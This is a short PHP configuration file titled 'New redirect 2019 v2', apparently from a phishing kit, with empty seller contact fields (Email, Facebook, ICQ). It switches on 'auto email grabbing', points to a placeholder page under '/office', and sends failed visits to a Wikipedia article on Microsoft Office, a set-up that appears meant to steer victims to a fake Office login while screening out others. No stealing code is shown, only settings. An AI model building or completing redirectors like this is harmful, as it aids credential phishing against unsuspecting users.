<?php
/* 

New redirect 2019 v2 

Email: 

Facebook: 

ICQ: 
*/
$autoEmail="true";//"true":Auto email grabing/ "false":without auto email grabing
$pagelink="https://yourpagelink.com/office";
$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
$redirecttype="1";// 1:header - 2:script
?>
